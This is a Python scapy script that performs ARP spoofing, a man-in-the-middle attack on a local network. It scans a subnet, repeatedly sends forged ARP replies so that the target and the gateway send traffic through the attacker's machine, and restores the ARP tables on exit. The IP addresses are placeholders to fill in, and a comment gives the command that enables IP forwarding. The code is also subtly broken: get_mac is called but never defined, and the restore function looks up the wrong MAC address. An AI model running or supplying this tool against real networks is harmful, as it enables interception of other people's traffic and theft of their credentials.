"""Module containing the functions necessary to craft and spoof ARP on a target"""

# Standard Library imports
import sys

# Third-party imports
import scapy.all as scapy
from scapy.layers.l2 import *


# Need this cmd to be able to handle packets forwarded by the target machine and pass to gateway
# echo 1 > /proc/sys/net//ipv4/ip_forward

def arp_scan(ips: str) -> List['str']:
    """
    Function that performs an ARP scan of the subnet that is being targeted,
    this will provide the other functions with specific targets to spoof.

    :param ips: (required) Target IP range with CIDR block (e.g., 10.10.10.0/24)
    :return: A list containing a list of IPs that were returned from the ARP scan
    """
    arp_request = ARP(pdst=ips)  # where should the request go/what ip - /24 subnet
    # arp_request.show() #show content
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # send the packet to the broadcast MAC address
    arp_request_broadcast = broadcast / arp_request  # combine the ip and MAC address to create an ARP request for any IP in the subnet
    answered_request_list = srp(arp_request_broadcast, timeout=1, verbose=False)[
        0]  # srp allows for packets with custom Ether to be sent & wait 1 sec for response and move on/ returns 2 vals
    return answered_request_list[0][1]


def craft_spoof_response(target_ip: str, spoofed_ip: str) -> None:
    """
    Function that takes two args that contain the target endpoint IP,
    and the spoofed IP that you want the target to think is the router.
    Pass that data to the ARP class from scapy to craft the unsolicited
    response packet to send to the target.

    :param target_ip: (required) Get the target IP from enumerating targets in the internal network
    :param spoofed_ip: (required) Set the router IP path on the target to be the attacker machine
    :return: None
    """
    target_mac_address = get_mac(target_ip)  # pass the target IP to a func that gets MAC addresses

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac_address,
                 psrc=spoofed_ip)  # this is a response packet defined at (op=2) sending arp spoof to target client and faking router IP
    scapy.send(packet, verbose=False)


def restore(dest_ip: str, src_ip: str) -> None:
    """
    Function that restores the target to the correct IPs so that there are no errors
    when the program terminates.

    :param dest_ip: (required) Correct destination IP for the IGW router
    :param src_ip: (required) Correct source IP for traffic coming from the target machine
    :return: None
    """
    dest_mac_address = get_mac(dest_ip)
    src_mac_address = get_mac(dest_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac_address, psrc=src_ip, hwsrc=src_mac_address)
    scapy.send(packet, count=4, verbose=False)


# SET THESE VARS TO THE IPs THAT ARE WANTED
target_Ip = "<IP ADDRESS>"
gateway_Ip = "<IP ADDRESS>"
try:
    i = 2
    while True:
        craft_spoof_response(target_Ip, gateway_Ip)
        craft_spoof_response(gateway_Ip, target_Ip)
        # print("\r[+] sent 2 packets -- " + str(i) + " total packets have been sent", end="")  # ,(used for py2)
        print(f'\r[+] sent 2 packets -- {str(i)} total packets have been sent', end="")
        sys.stdout.flush()  # (used for py2)
        i += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ....resetting ARP tables & exiting")
    restore(target_Ip, gateway_Ip)
    restore(gateway_Ip, target_Ip)
